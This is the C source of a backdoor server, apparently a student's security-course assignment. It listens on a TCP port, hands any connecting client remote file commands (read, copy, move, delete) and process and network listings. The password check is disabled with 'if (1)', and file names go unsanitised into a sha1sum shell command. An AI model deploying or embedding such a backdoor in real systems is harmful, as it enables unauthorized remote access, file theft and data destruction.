
/*
 * CPSC 526 Assignment 2
 * Geordie Tait
 * 10013837
 * T02
 *
 * Backdoor server
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>

#define SPACER "  " // spacer for output lines
#define MAXFILES 16384 // maximum files in snapshot
#define MAXLENGTH 256 // maximum length of filename/hash

// global variables nicely grouped
struct {
    int port; // listening port
    char buffer[512]; // temporary buffer for input
    char output[1024]; // output buffer
    char snapFiles[MAXFILES][MAXLENGTH]; // snapshot file list
    char snapHashes[MAXFILES][MAXLENGTH]; // snapshot hash list
    char diffFiles[MAXFILES][MAXLENGTH]; // current file list
    char diffHashes[MAXFILES][MAXLENGTH]; // current hash list
} globals;

// report error message & exit
void die( const char * errorMessage, ...) {
    fprintf( stderr, "Error: ");
    va_list args;
    va_start( args, errorMessage);
    vfprintf( stderr, errorMessage, args);
    fprintf( stderr, "\n");
    va_end( args);
    exit(-1);
}

// read a line of text from file descriptor into provided buffer, up to provided char limit
int readLineFromFd( int fd, char * buff, int max) {
    char * ptr = buff;
    int count = 0;
    int result = 1;
    
    while(1) {
        // try to read in the next character from fd, exit loop on failure
        if (read(fd, ptr, 1) < 1) {
            result = 0;
            break;
        }

        // character stored, now advance ptr and character count
        ptr ++;
        count++;

        // if last character read was a newline, exit loop
        if (*(ptr - 1) == '\n') break;

        // if the buffer capacity is reached, exit loop
        if (count >= max - 1) break;
        
    }
    
    // rewind ptr to the last read character
    ptr --;

    // trim trailing spaces (including new lines, telnet's \r's)
    while (ptr > buff && isspace(*ptr)) ptr--;

    // terminate the string
    * (ptr + 1) = '\0';
    
    return result;
}

// write a string to file descriptor
int writeStrToFd( int fd, char * str) {
   return write( fd, str, strlen( str));
}

// execute pwd command
// display current working directory
int pwdCommand(int connSockFd, char *arg1) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // no arguments
    if (arg1 == NULL) {
        getcwd(globals.output, sizeof(globals.output));
        writeStrToFd(connSockFd, globals.output);
    }

    // invalid arguments
    else 
        writeStrToFd(connSockFd, "pwd takes no arguments");
    return 0;
}

// execute cd command
// change working directory
int cdCommand(int connSockFd, char *arg1, char *arg2) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // one argument
    if (arg1 != NULL && arg2 == NULL) {
        if (chdir(arg1) > -1) {
            writeStrToFd(connSockFd, "Changed dir to ");
            writeStrToFd(connSockFd, arg1);
        }
        else
            writeStrToFd(connSockFd, "Could not open directory");
    }

    // invalid arguments
    else
        writeStrToFd(connSockFd, "Usage: cp <file1><file2>");
    return 0;
}

// execute ls command
// display contents of working directory
int lsCommand(int connSockFd, char *arg1) {

    // no arguments
    if (arg1 == NULL) {
        DIR *d;
        struct dirent *dir;
        d = opendir(".");
        if (d) {
            while ((dir = readdir(d)) != NULL) {
                if (writeStrToFd(connSockFd, SPACER) < 1) return -1;
                writeStrToFd(connSockFd, dir->d_name);
                writeStrToFd(connSockFd, "\n");
            }
            closedir(d);
        }
    }

    // invalid arguments
    else {
        if (writeStrToFd(connSockFd, SPACER) < 1) return -1;
        writeStrToFd(connSockFd, "ls takes no arguments");
    }
    return 0;
}

// copy file in to file out
int copyFile(const char *in, const char *out) {
    int fout, fin;
    char buf[4096];
    ssize_t n;
    int saved_errno;

    // open files for reading/writing
    fin = open(in, O_RDONLY);
    if (fin < 0) return -1;
    fout = open(out, O_WRONLY | O_CREAT | O_EXCL, 0666);
    if (fout < 0) goto oerror;

    // copy data
    while (n = read(fin, buf, sizeof buf), n > 0) {
        char *optr = buf;
        ssize_t nwritten;
        do {
            nwritten = write(fout, optr, n);
            if (nwritten >= 0) {
                n -= nwritten;
                optr += nwritten;
            }
            else if (errno != EINTR) goto oerror;
        } while (n > 0);
    }
    if (n == 0) {
        if (close(fout) < 0) {
            fout = -1;
            goto oerror;
        }
        close(fin);
        return 0;
    }

    // error occurred
  oerror:
    saved_errno = errno;
    close(fin);
    if (fout >= 0) close(fout);
    errno = saved_errno;
    return -1;
}

// execute cp command
// copy a file to another location
int cpCommand(int connSockFd, char *arg1, char *arg2, char *arg3) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // two arguments
    if (arg1 != NULL && arg2 != NULL && arg3 == NULL) {
        if (copyFile(arg1, arg2) == 0) {
            writeStrToFd(connSockFd, arg1);
            writeStrToFd(connSockFd, " was copied to ");
            writeStrToFd(connSockFd, arg2);
        }
        else
            writeStrToFd(connSockFd, "Could not copy file");
    }

    // invalid arguments
    else
        writeStrToFd(connSockFd, "Usage: cp <file1> <file2>");
    return 0;
}

// execute mv command
// move a file
int mvCommand(int connSockFd, char *arg1, char *arg2, char *arg3) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // two arguments
    if (arg1 != NULL && arg2 != NULL && arg3 == NULL) {
        if (rename(arg1,arg2) == 0) {
            writeStrToFd(connSockFd, arg1);
            writeStrToFd(connSockFd, " was moved to ");
            writeStrToFd(connSockFd, arg2);
        }
        else
            writeStrToFd(connSockFd, "Could not move file");
    }

    // invalid arguments
    else
        writeStrToFd(connSockFd, "Usage: mv <file1> <file2>");
    return 0;
}

// execute rm command
// delete a file
int rmCommand(int connSockFd, char *arg1, char *arg2) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // one argument
    if (arg1 != NULL && arg2 == NULL) {
        if (remove(arg1) == 0)
            writeStrToFd(connSockFd, "File deleted");
        else
            writeStrToFd(connSockFd, "Could not delete file");
    }

    // invalid arguments
    else
        writeStrToFd(connSockFd, "Usage: rm <file>");
    return 0;
}

// execute cat command
// display the contents of a file
int catCommand(int connSockFd, char *arg1, char *arg2) {

    // one argument
    if (arg1 != NULL && arg2 == NULL) {
        FILE *file = fopen(arg1, "r");
        char line[256];

        // read lines from file
        while(fgets(line, sizeof(line), file)) {        
            if (writeStrToFd(connSockFd, SPACER) < 1) return -1;
            writeStrToFd(connSockFd, line);
        }
    }

    // invalid arguments
    else {
        if (writeStrToFd(connSockFd, SPACER) < 1) return -1;
        writeStrToFd(connSockFd, "Usage: cat <file>");
    }
    return 0;
}

// save files and hashes for the working directory
void snapshot(char files[MAXFILES][MAXLENGTH], char hashes[MAXFILES][MAXLENGTH]) {
    DIR *d;
    struct dirent *dir;
    int i = 0;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            strcpy(files[i],dir->d_name);
            
            FILE *f;
            char cmd[128];
            sprintf(cmd, "sha1sum %s", dir->d_name);
            f = popen(cmd,"r"); 

            // get the output
            while (fgets(globals.output, sizeof(globals.output), f) != NULL) {
                char *first = strtok(globals.output, " ");
                strcpy(hashes[i], first);
            }
            pclose(f);
            i++;
        }
        files[i][0] = '|';
        closedir(d);
    }
}

// execute snap command
// take a snapshot of the working directory
int snapCommand(int connSockFd, char *arg1) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // no arguments
    if (arg1 == NULL) {

        // take the snapshot and get hashes
        snapshot(globals.snapFiles, globals.snapHashes);
        writeStrToFd(connSockFd, "Snapshot taken");
    }

    // invalid arguments
    else {
        writeStrToFd(connSockFd, "snap takes no arguments");
    }
    return 0;
}

// execute diff command
// compare the working directory to a saved snapshot
int diffCommand(int connSockFd, char *arg1) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // no arguments
    if (arg1 == NULL) {

        // check if the snapshot exists
        if (strcmp(globals.snapFiles[0], "") == 0) {
            writeStrToFd(connSockFd, "Take a snapshot first");
            return 0;
        }

        // get current files and hashest
        snapshot(globals.diffFiles, globals.diffHashes);
        writeStrToFd(connSockFd, "[+] Added   [-] Deleted   [~] Modified\n");

        // kept, deleted, and modified files
        for (int i = 0; i < MAXFILES; i++) {
            if (globals.snapFiles[i][0] == '|') break;
            int deleted = 1;
            int modified = 0;
            writeStrToFd(connSockFd, SPACER);

            for (int j = 0; j < MAXFILES; j++) {
                if (globals.diffFiles[j][0] == '|') break;

                if (strcmp(globals.snapFiles[i], globals.diffFiles[j]) == 0) {
                    deleted = 0;
                    if (!strcmp(globals.snapHashes[i], globals.diffHashes[j]) == 0)
                        modified = 1;
                    break;
                }
            }

            if (deleted)
                writeStrToFd(connSockFd, "[-] ");
            else if (modified)
                writeStrToFd(connSockFd, "[~] ");
            else
                writeStrToFd(connSockFd, "    ");
            writeStrToFd(connSockFd, globals.snapFiles[i]);
            writeStrToFd(connSockFd, "\n                SHA1: ");
            writeStrToFd(connSockFd, globals.snapHashes[i]);
            writeStrToFd(connSockFd, "\n");
        }
        
        // new files
        for (int j = 0; j < MAXFILES; j++) {
            if (globals.diffFiles[j][0] == '|') break;
            int exists = 0;

            for (int i = 0; i < MAXFILES; i++) {
                if (globals.snapFiles[i][0] == '|') break;

                if (strcmp(globals.diffFiles[j], globals.snapFiles[i]) == 0) {
                    exists = 1;
                    break;
                }
            }

            if (!exists) {
                writeStrToFd(connSockFd, SPACER);
                writeStrToFd(connSockFd, "[+] ");
                writeStrToFd(connSockFd, globals.diffFiles[j]);
                writeStrToFd(connSockFd, "\n                SHA1: ");
                writeStrToFd(connSockFd, globals.diffHashes[j]);
                writeStrToFd(connSockFd, "\n");
            }
        }
    }

    // invalid arguments
    else {
        writeStrToFd(connSockFd, "diff takes no arguments");
    }
    return 0;
}

// execute help command
// display a list of commands or details on a given command
int helpCommand(int connSockFd, char *arg1, char *arg2) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // no arguments
    if (arg1 == NULL) {
        writeStrToFd(connSockFd, "Supported commands:\n");
        writeStrToFd(connSockFd, SPACER);
        writeStrToFd(connSockFd, "pwd cd ls cp mv rm cat snap diff help logout off who net ps");
    }

    // one argument
    else if (arg1 != NULL && arg2 == NULL) {
        if (strcmp(arg1,"pwd") == 0) {
            writeStrToFd(connSockFd, "pwd command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: pwd\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Return the current working directory");
        }
        else if (strcmp(arg1,"cd") == 0) {
            writeStrToFd(connSockFd, "cd command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: cd <dir>\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Change the current working directory to <dir>");
        }
        else if (strcmp(arg1,"ls") == 0) {
            writeStrToFd(connSockFd, "ls command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: ls\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "List the contents of the working directory");
        }
        else if (strcmp(arg1,"cp") == 0) {
            writeStrToFd(connSockFd, "cp command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: cp <file1> <file2>\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Copy file1 to file2");
        }
        else if (strcmp(arg1,"mv") == 0) {
            writeStrToFd(connSockFd, "mv command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Rename file1 to file2");
        }
        else if (strcmp(arg1,"rm") == 0) {
            writeStrToFd(connSockFd, "rm command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: rm <file>\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Delete file");
        }
        else if (strcmp(arg1,"cat") == 0) {
            writeStrToFd(connSockFd, "cat command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: cat <file>\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Return contents of the file");
        }
        else if (strcmp(arg1,"snap") == 0) {
            writeStrToFd(connSockFd, "snap command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: snap\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Take a snapshot of all the files in the current directory and save it in memory");
        }
        else if (strcmp(arg1,"diff") == 0) {
            writeStrToFd(connSockFd, "diff command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: diff\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Compare the contents of the current directory to the saved snapshot");
        }
        else if (strcmp(arg1,"help") == 0) {
            writeStrToFd(connSockFd, "help command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: help [cmd]\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Print a list of commands and if given an argument print detailed help for the command");
        }
        else if (strcmp(arg1,"logout") == 0) {
            writeStrToFd(connSockFd, "logout command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: logout\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Disconnect client");
        }
        else if (strcmp(arg1,"off") == 0) {
            writeStrToFd(connSockFd, "off command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: off\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Terminate the backdoor server");
        }
        else if (strcmp(arg1,"who") == 0) {
            writeStrToFd(connSockFd, "who command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: who\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Displays a list of currently logged in users");
        }
        else if (strcmp(arg1,"net") == 0) {
            writeStrToFd(connSockFd, "net command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: net\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Show current networking configuration");
        }
        else if (strcmp(arg1,"ps") == 0) {
            writeStrToFd(connSockFd, "ps command\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Usage: ps\n");
            writeStrToFd(connSockFd, SPACER);
            writeStrToFd(connSockFd, "Show currently running processes");
        }
        else {
            writeStrToFd(connSockFd, arg1);
            writeStrToFd(connSockFd, " is not an accepted command");
        }
    }

    // invalid arguments
    else {
        writeStrToFd(connSockFd, "Usage: help [cmd]");
    }
    return 0;
}

// execute logout command
// disconnect from client
int logoutCommand(int connSockFd, char *arg1) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // no arguments
    if (arg1 == NULL) {
        writeStrToFd(connSockFd, "Logging out");
       return -1;
    }

    // invalid arguments
    else {
        writeStrToFd(connSockFd, "logout takes no arguments");
    }
    return 0;
}

// execute off command
// terminate the server
int offCommand(int connSockFd, char *arg1) {
    if (writeStrToFd(connSockFd, SPACER) < 1) return -1;

    // no arguments
    if (arg1 == NULL) {
        printf("Terminating server\n");
        writeStrToFd(connSockFd, "Terminating server");
        close(connSockFd);
        exit(0);
    }

    // invalid arguments
    else {
        writeStrToFd(connSockFd, "off takes no arguments");
    }
    return 0;
}

// execute given linux console command
int consoleCommand(int connSockFd, char *arg1, char *cmd) {

    // no arguments
    if (arg1 == NULL) {
        FILE *f;
        f = popen(cmd,"r"); 

        // get the output
        while (fgets(globals.output, sizeof(globals.output), f) != NULL) {
            if (writeStrToFd(connSockFd, SPACER) < 1) return -1;
            writeStrToFd(connSockFd, globals.output);
        }
        pclose(f);
    }

    // invalid arguments
    else {
        writeStrToFd(connSockFd, "That command takes no arguments");
    }
    return 0;
}

// function for retrieving and executing remote commands
void processCommands(int connSockFd) {

    while (1) {

        // print prompt and exit loop if connection lost
        if (writeStrToFd(connSockFd, "% ") < 1) break;

        // read command input and exit if connection lost
        if (readLineFromFd(connSockFd, globals.buffer, sizeof(globals.buffer)) < 1) break;
        printf("User entered: %s\n", globals.buffer);

        // split commands from arguments
        char *cmd = strtok(globals.buffer, " ");
        char *arg1 = strtok(NULL, " ");
        char *arg2 = strtok(NULL, " ");
        char *arg3 = strtok(NULL, " ");

        // process commands
        // exit loop if connection lost
        //
        // pwd: print current working directory
        if (strcmp(cmd, "pwd") == 0) {
            if (pwdCommand(connSockFd, arg1) < 0) break;
        }

        // cd <dir>: change working directory
        else if (strcmp(cmd, "cd") == 0) {
            if (cdCommand(connSockFd, arg1, arg2) < 0) break;
        }

        // ls: print directory contents
        else if (strcmp(cmd, "ls") == 0) {
            if (lsCommand(connSockFd, arg1) < 0) break;
        }

        // cp <file1> <file2>: copy file1 to file2
        else if (strcmp(cmd, "cp") == 0) {
            if (cpCommand(connSockFd, arg1, arg2, arg3) < 0) break;
        }

        // mv <file1> <file2>: move file1 to file2
        else if (strcmp(cmd, "mv") == 0) {
            if (mvCommand(connSockFd, arg1, arg2, arg3) < 0) break;
        }
       
        // rm <file>: delete file
        else if (strcmp(cmd, "rm") == 0) {
            if(rmCommand(connSockFd, arg1, arg2) < 0) break;
        }

        // cat <file>: return file contents
        else if (strcmp(cmd, "cat") == 0) {
            if (catCommand(connSockFd, arg1, arg2) < 0) break;
        }

        // snap: return snapshot of files in current directory
        else if (strcmp(cmd, "snap") == 0) {
            if (snapCommand(connSockFd, arg1) < 0) break;
        }

        // diff: compare contents of current directory to snapshot
        else if (strcmp(cmd, "diff") == 0) {
            if (diffCommand(connSockFd, arg1) < 0) break;
        }

        // help <cmd>: print a list of commands or get detailed help for a command
        else if (strcmp(cmd, "help") == 0) {
            if (helpCommand(connSockFd, arg1, arg2) < 0) break;
        }

        // logout: log out of the server
        else if (strcmp(cmd, "logout") == 0) {
            if (logoutCommand(connSockFd, arg1) < 0) break;
        }

        // off: terminate the server
        else if (strcmp(cmd, "off") == 0) {
            if (offCommand(connSockFd, arg1) < 0) break;
        }

        // who: list logged in users
        else if (strcmp(cmd, "who") == 0) {
            if (consoleCommand(connSockFd, arg1, "who") < 0) break;
        }

        // net: display network configuration
        else if (strcmp(cmd, "net") == 0) {
            if (consoleCommand(connSockFd, arg1, "ifconfig") < 0) break;
        }

        // ps: display process list
        else if (strcmp(cmd, "ps") == 0) {        
            if (consoleCommand(connSockFd, arg1, "ps") < 0) break;
        }

        // invalid command
        else if (!strcmp(cmd, "") == 0) {
            if (writeStrToFd(connSockFd, "Invalid command") < 1) break;
        }

        writeStrToFd(connSockFd, "\n");
    }
}

// main program function (entry point)
int main( int argc, char ** argv)
{
    // parse command line arguments
    if( argc != 2) die( "Usage: server port");
    char * end = NULL;
    globals.port = strtol( argv[1], & end, 10);
    if( * end != 0) die( "bad port %s", argv[1]);

    // create a listenning socket on a given port
    struct sockaddr_in servaddr;
    int listenSockFd = socket(AF_INET, SOCK_STREAM, 0);
    if( listenSockFd < 0) die("socket() failed");
    bzero( (char *) & servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htons(INADDR_ANY);
    servaddr.sin_port = htons(globals.port);
    if( bind(listenSockFd, (struct sockaddr *) & servaddr, sizeof(servaddr)) < 0)
        die( "Could not bind listening socket: %s", strerror( errno));

    // listen for a new connection
    if( listen(listenSockFd, 3) != 0)
        die( "Could not listen for incoming connections.");

    // main server loop
    while(1) {
        printf( "Waiting for a new connection...\n");

        // accept a new connection
        int connSockFd = accept(listenSockFd, NULL, NULL);
        if( connSockFd < 0) {
            printf( "accept() failed: %s", strerror(errno));
            continue;
        }
        printf( "Talking to someone.\n");

        // sey hello to the other side
        writeStrToFd( connSockFd, "Backdoor Server 1.0\nEnter password:\n");

        // read response from socket
        readLineFromFd( connSockFd, globals.buffer, sizeof(globals.buffer));

        // check if it was a correct password
        if (1) {//( strcmp( globals.buffer, "password") == 0) {

            // password was correct, begin taking commands
            printf( "Someone used the correct password\n");
            writeStrToFd( connSockFd, "Login successful\n");
            processCommands(connSockFd);
        }
        else {
            // password was incorrect, reject connection
            printf( "Someone used an incorrect password\n");
            writeStrToFd( connSockFd, "Invalid password\n");
        }

        // close the connection
        close( connSockFd);
    }

    // this will never be called
    close(listenSockFd);
    return 0;
}


